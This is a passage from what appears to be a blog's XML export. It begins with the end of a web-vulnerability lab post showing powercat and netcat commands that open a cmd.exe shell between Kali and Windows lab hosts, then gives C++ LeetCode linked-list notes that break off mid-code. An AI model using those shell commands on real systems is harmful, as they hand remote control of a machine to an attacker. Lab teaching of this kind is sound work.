<p><img src="https://img2020.cnblogs.com/blog/2265061/202102/2265061-20210204114932441-1593681207.png" alt="img"></p>
<p>Windows上的powercat正向连接Kali上的nc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali:192.168.158.111 nc -lvvp 4444 win-10:192.168.158.110 powercat -c 192.168.158.111 -p 4444 -e cmd.exe</span><br></pre></td></tr></table></figure>

<p>kali上的nc反向链接到windows上的powercat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali:192.168.158.111 nc -vv 192.168.158.110 4444 win-10:192.168.158.110 powercat -l -p 4444 -e cmd.exe</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web漏洞基础篇</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>一、链表</title>
    <url>/2025/12/03/%E4%B8%80%E3%80%81%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="一、链表"><a href="#一、链表" class="headerlink" title="一、链表"></a>一、链表</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="keyword">int</span> x):<span class="built_in">val</span>(x),<span class="built_in">next</span>(<span class="literal">NULL</span>)&#123;&#125;<span class="comment">//构造函数</span></span><br><span class="line">&#125;</span><br><span class="line">通过自己定义构造函数初始化节点：</span><br><span class="line">ListNode* head = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">使用默认构造函数初始化节点：</span><br><span class="line">ListNode* head = <span class="keyword">new</span> <span class="built_in">ListNode</span>();</span><br><span class="line">head-&gt;val = <span class="number">5</span>;</span><br></pre></td></tr></table></figure>
<h3 id="707-设计链表"><a href="#707-设计链表" class="headerlink" title="707 设计链表"></a>707 设计链表</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLinkedList</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 定义链表节点结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkedNode</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> val;</span><br><span class="line">        LinkedNode* next;</span><br><span class="line">        <span class="built_in">LinkedNode</span>(<span class="keyword">int</span> val):<span class="built_in">val</span>(val), <span class="built_in">next</span>(<span class="literal">nullptr</span>)&#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化链表</span></span><br><span class="line">    <span class="built_in">MyLinkedList</span>() &#123;</span><br><span class="line">        _dummyHead = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(<span class="number">0</span>); <span class="comment">// 这里定义的头结点 是一个虚拟头结点，而不是真正的链表头结点</span></span><br><span class="line">        _size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取链表中下标为 index 的节点的值。如果下标无效，则返回 -1</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt; (_size - <span class="number">1</span>) || index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//真正头结点 _dummyHead-&gt;next 不找前驱，找本结点</span></span><br><span class="line">        LinkedNode* cur = _dummyHead-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(index--)&#123;  </span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 头插：head前面插入结点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addAtHead</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        LinkedNode* newNode = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(val);</span><br><span class="line">        newNode-&gt;next = _dummyHead-&gt;next;</span><br><span class="line">        _dummyHead-&gt;next = newNode;</span><br><span class="line">        _size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尾插：在链表最后面添加一个节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addAtTail</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        LinkedNode* newNode = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(val);</span><br><span class="line">        LinkedNode* cur = _dummyHead;</span><br><span class="line">        <span class="keyword">while</span>(cur-&gt;next != <span class="literal">nullptr</span>)&#123;<span class="comment">//找尾结点</span></span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur-&gt;next = newNode;</span><br><span class="line">        _size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入到 下标为 index 的节点 之前</span></span><br><span class="line">    <span class="comment">// index 等于链表的长度，则说明是新插入的节点为链表的尾结点</span></span><br><span class="line">    <span class="comment">// index大于链表的长度，则返回空</span></span><br><span class="line">    <span class="comment">// index小于0，则在头部插入节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addAtIndex</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; _size) </span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>) </span><br><span class="line">            index = <span class="number">0</span>;        </span><br><span class="line">        LinkedNode* newNode = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(val);</span><br><span class="line">        LinkedNode* cur = _dummyHead;<span class="comment">//找前驱：_dummyHead</span></span><br><span class="line">        <span class="keyword">while</span>(index--) &#123;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        newNode-&gt;next = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = newNode;</span><br><span class="line">        _size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除 下标为 index 的节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteAtIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= _size || index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedNode* cur = _dummyHead;<span class="comment">// 找前驱：_dummyHead</span></span><br><span class="line">        <span class="keyword">while</span>(index--) &#123;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedNode* tmp = cur-&gt;next;<span class="comment">//被删结点 tmp</span></span><br><span class="line">        cur-&gt;next = cur-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> tmp;</span><br><span class="line">        tmp=<span class="literal">nullptr</span>;</span><br><span class="line">        _size--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印链表</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printLinkedList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        LinkedNode* cur = _dummyHead-&gt;next;</span><br><span class="line">        <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">            cout &lt;&lt; cur-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> _size;</span><br><span class="line">    LinkedNode* _dummyHead;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="206-链表反转"><a href="#206-链表反转" class="headerlink" title="206 链表反转"></a>206 链表反转</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//三个指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ListNode *tmp = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;<span class="comment">//最后cur和tmp均指向原始链表的末尾null,而pre指向原始链表的尾结点</span></span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="25-K-个一组翻转链表"><a href="#25-K-个一组翻转链表" class="headerlink" title="25 K 个一组翻转链表"></a>25 K 个一组翻转链表</h3><p>给你链表的头节点 head ，每 k 个节点一组进行翻转，请你返回修改后的链表。<br>k 是一个正整数，它的值小于或等于链表的长度。如果节点总数不是 k 的整数倍，那么请将最后剩余的节点保持原有顺序。<br>你【不能只是单纯的改变节点内部的值，而是需要实际进行节点交换】。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 翻转一个子链表，并且返回新的头与尾</span></span><br><span class="line">    <span class="function">pair&lt;ListNode*, ListNode*&gt; <span class="title">myReverse</span><span class="params">(ListNode* head, ListNode* tail)</span> </span>&#123;</span><br><span class="line">        ListNode* prev = tail-&gt;next;</span><br><span class="line">        ListNode* p = head;</span><br><span class="line">        <span class="keyword">while</span> (prev != tail) &#123;</span><br><span class="line">            ListNode* nex = p-&gt;next;</span><br><span class="line">            p-&gt;next = prev;</span><br><span class="line">            prev = p;</span><br><span class="line">            p = nex;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;tail, head&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseKGroup</span><span class="params">(ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        ListNode* hair = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        hair-&gt;next = head;</span><br><span class="line">        ListNode* pre = hair;</span><br><span class="line">        <span class="keyword">while</span> (head) &#123;</span><br><span class="line">            ListNode* tail = pre;</span><br><span class="line">            <span class="comment">// 查看剩余部分长度是否大于等于 k</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">                tail = tail-&gt;next;</span><br><span class="line">                <span class="keyword">if</span> (!tail) &#123;</span><br><span class="line">                    <span class="keyword">return</span> hair-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ListNode* nex = tail-&gt;next;</span><br><span class="line">            <span class="built_in">tie</span>(head, tail) = <span class="built_in">myReverse</span>(head, tail);</span><br><span class="line">            <span class="comment">// 把子链表重新接回原链表</span></span><br><span class="line">            pre-&gt;next = head;</span><br><span class="line">            tail-&gt;next = nex;</span><br><span class="line">            pre = tail;</span><br><span class="line">            head = tail-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hair-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="138-复制带随机指针的链表"><a href="#138-复制带随机指针的链表" class="headerlink" title="138 复制带随机指针的链表"></a>138 复制带随机指针的链表</h3><p>给你一个长度为 n 的链表，【每个节点包含一个额外增加的随机指针 random】，该指针可以指向链表中的任何节点或空节点。</p>
<p>构造这个链表的 <strong>深拷贝</strong>。返回复制链表的头节点。</p>
<p>例如，如果原链表中有 X 和 Y 两个节点，其中 X.random –&gt; Y 。那么在复制链表中对应的两个节点 x 和 y ，同样有 x.random –&gt; y 。</p>
<p>用一个由 n 个节点组成的链表来表示输入/输出中的链表。每个节点用一个 [val, random_index] 表示：</p>
<pre><code>int val;
Node* next;
Node* random;
</code></pre>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;Node*,Node*&gt; maap;<span class="comment">//记录每个结点的 新结点 的创建情况</span></span><br><span class="line">    <span class="function">Node* <span class="title">copyRandomList</span><span class="params">(Node* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="keyword">if</span>(!maap.<span class="built_in">count</span>(head))&#123;<span class="comment">//不在，还没创建  </span></span><br><span class="line">            Node *newHead = <span class="keyword">new</span> <span class="built_in">Node</span>(head-&gt;val);<span class="comment">//创建新结点</span></span><br><span class="line">            maap[head] = newHead;<span class="comment">//存入哈希表</span></span><br><span class="line">            newHead-&gt;next = <span class="built_in">copyRandomList</span>(head-&gt;next);</span><br><span class="line">            newHead-&gt;random = <span class="built_in">copyRandomList</span>(head-&gt;random);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> maap[head];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//很方便 理解</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;Node*,Node*&gt; maap;<span class="comment">//记录每个结点的 新结点 的创建情况</span></span><br><span class="line">    <span class="function">Node* <span class="title">copyRandomList</span><span class="params">(Node* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        Node *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur)&#123;</span><br><span class="line">            Node *node = <span class="keyword">new</span> <span class="built_in">Node</span>(cur-&gt;val);</span><br><span class="line">            maap[cur] = node;<span class="comment">//全部装入</span></span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125; </span><br><span class="line">        cur = head;<span class="comment">//再次指向 head 进行遍历</span></span><br><span class="line">        <span class="keyword">while</span>(cur)&#123;</span><br><span class="line">            <span class="comment">//关键在 下面这两句</span></span><br><span class="line">            maap[cur]-&gt;next = maap[cur-&gt;next];</span><br><span class="line">            maap[cur]-&gt;random = maap[cur-&gt;random];</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maap[head];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="21-归并两个有序链表——升序-升序-gt-升序"><a href="#21-归并两个有序链表——升序-升序-gt-升序" class="headerlink" title="21 归并两个有序链表——升序+升序-&gt;升序"></a>21 归并两个有序链表——升序+升序-&gt;升序</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归——不好理解</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l1==<span class="literal">nullptr</span> || l2==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> (l1==<span class="literal">nullptr</span>)?l2:l1;</span><br><span class="line">        <span class="keyword">if</span>(l1-&gt;val&lt;=l2-&gt;val)&#123;</span><br><span class="line">            l1-&gt;next = <span class="built_in">mergeTwoLists</span>(l1-&gt;next,l2);</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            l2-&gt;next = <span class="built_in">mergeTwoLists</span>(l1,l2-&gt;next);</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代    </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode *dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        ListNode *pre = dummyHead;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">NULL</span> &amp;&amp; l2!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val &lt; l2-&gt;val)&#123;</span><br><span class="line">                pre-&gt;next = l1;</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre-&gt;next = l2;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            pre = pre-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//合并之后，把剩余某个链表 全部赋值即可</span></span><br><span class="line">        pre-&gt;next = l1==<span class="literal">NULL</span>? l2:l1;</span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="23-合并-K-个升序链表"><a href="#23-合并-K-个升序链表" class="headerlink" title="23 合并 K 个升序链表"></a>23 合并 K 个升序链表</h3><p>给你一个【链表数组】，每个链表都已经按【升序排列】。<br>请你将所有链表合并到一个升序链表中，返回合并后的链表。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">merge</span><span class="params">(ListNode *l1,ListNode *l2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l1==<span class="literal">nullptr</span> || l2==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l1==<span class="literal">nullptr</span>?l2:l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l1-&gt;val&lt;=l2-&gt;val)&#123;</span><br><span class="line">            l1-&gt;next = <span class="built_in">merge</span>(l1-&gt;next,l2);</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            l2-&gt;next = <span class="built_in">merge</span>(l1,l2-&gt;next);</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeKLists</span><span class="params">(vector&lt;ListNode*&gt;&amp; lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = lists.<span class="built_in">size</span>();</span><br><span class="line">        ListNode *node = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            node = <span class="built_in">merge</span>(node,lists[i]);<span class="comment">//顺序合并</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="24-两两交换链表中的节点"><a href="#24-两两交换链表中的节点" class="headerlink" title="24 两两交换链表中的节点"></a>24 两两交换链表中的节点</h3><p>给你一个链表，<u>两两交换</u>其中相邻的节点，并返回交换后链表的头节点。你必须<strong>在不修改节点内部的值的情况下完成</strong>本题（即，只能进行节点交换）。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">swapPairs</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);<span class="comment">//虚结点</span></span><br><span class="line">        dummy-&gt;next = head;</span><br><span class="line">        ListNode *temp = dummy;<span class="comment">//temp 虚结点</span></span><br><span class="line">        <span class="keyword">while</span>(temp-&gt;next != <span class="literal">nullptr</span> &amp;&amp; temp-&gt;next-&gt;next != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ListNode *node1 = temp-&gt;next;<span class="comment">//第一个结点</span></span><br><span class="line">            ListNode *node2 = temp-&gt;next-&gt;next;<span class="comment">//第二个结点</span></span><br><span class="line">            temp-&gt;next = node2;</span><br><span class="line">            node1-&gt;next = node2-&gt;next;</span><br><span class="line">            node2-&gt;next = node1;</span><br><span class="line">            temp = node1;<span class="comment">//后移</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="141-环形链表——是否存在环"><a href="#141-环形链表——是否存在环" class="headerlink" title="141 环形链表——是否存在环"></a>141 环形链表——是否存在环</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表O(N) N结点数</span></span><br><span class="line"><span class="comment">    最容易想到的方法是遍历所有节点，每次遍历到一个节点时，判断该节点此前是否被访问过。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;ListNode*&gt; pot;<span class="comment">//unordered_set</span></span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pot.<span class="built_in">count</span>(head))<span class="comment">//set 中的 count()函数</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//如果存在（该点已经访问过），其值必是1，证明存在环</span></span><br><span class="line">            pot.<span class="built_in">insert</span>(head);<span class="comment">//没访问过，则插入哈希表</span></span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>「Floyd 判圈算法」（又称龟兔赛跑算法）</strong></p>
<p><strong>定义两个指针，一快一慢。慢指针每次只移动一步，而快指针每次移动两步</strong></p>
<ul>
<li>如果在移动的过程中，快指针反过来追上慢指针，就说明该链表为环形链表。否则快指针将到达链表尾部，该链表不为环形链表。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    快慢指针 </span></span><br><span class="line"><span class="comment">    定义两个指针，一快一慢。慢指针每次只移动一步，而快指针每次移动两步。初始时，慢指针在位置 head，而快指针在位置 head.next。</span></span><br><span class="line"><span class="comment">    如果在移动的过程中，快指针反过来【追上】慢指针，就说明该链表为环形链表。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    注意：快指针速度2；慢指针速度1；所以快指针相对于慢指针而言每次前进1个结点，所以如果有环的话一定会相遇</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span> || head-&gt;next == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode *slow = head;</span><br><span class="line">        ListNode *fast = head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(slow != fast)&#123;</span><br><span class="line">            <span class="keyword">if</span>(fast == <span class="literal">nullptr</span> || fast-&gt;next == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//fast一直没有进入环</span></span><br><span class="line">            &#125;</span><br><span class="line">            slow = slow-&gt;next;<span class="comment">//慢指针 每次1步</span></span><br><span class="line">            fast = fast-&gt;next-&gt;next;<span class="comment">//快指针 每次2步</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="142-环形链表-II——找环的入口"><a href="#142-环形链表-II——找环的入口" class="headerlink" title="142 环形链表 II——找环的入口"></a>142 环形链表 II——找环的入口</h3>返回进入环的第一个结点，如果没有环，则返回NULL<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;ListNode*&gt; pot;</span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pot.<span class="built_in">count</span>(head))</span><br><span class="line">                <span class="keyword">return</span> head;<span class="comment">//不同之处，直接返回结点指针</span></span><br><span class="line">            pot.<span class="built_in">insert</span>(head);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;<span class="comment">//NULL</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>快慢指针：</strong></p>
<p><img src="https://img-blog.csdnimg.cn/1640266274d440cd8332dbb60b3da4f3.png"><br>因为要找环形的入口，那么要求的是x，因为x表示 头结点到 环形入口节点的的距离。<br>所以要求x ，将x单独放在左面：x = n (y + z) - y ,<br>再从n(y+z)中提出一个 （y+z）来，整理公式之后为如下公式：<strong>x = (n - 1) (y + z) + z</strong> 注意这里n一定是大于等于1的，因为 fast指针至少要多走一圈才能相遇slow指针。<br><strong>【从头结点出发一个指针，从相遇节点 也出发一个指针，这两个指针每次只走 一个 节点， 当这两个指针相遇的时候就是 环形入口的节点。】</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    快慢指针slow fast</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//找相遇结点</span></span><br><span class="line">        ListNode *slow = head;</span><br><span class="line">        ListNode *fast = head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(slow==fast)&#123;</span><br><span class="line">                <span class="comment">// 快慢指针相遇，此时从head 和 相遇点，同时查找直至相遇</span></span><br><span class="line">                ListNode *index1 = fast;<span class="comment">//相遇处</span></span><br><span class="line">                ListNode *index2 = head;<span class="comment">//头结点处</span></span><br><span class="line">                <span class="keyword">while</span>(index1!=index2)&#123;</span><br><span class="line">                    index1 = index1-&gt;next;</span><br><span class="line">                    index2 = index2-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> index2;<span class="comment">//环的入口处 </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span 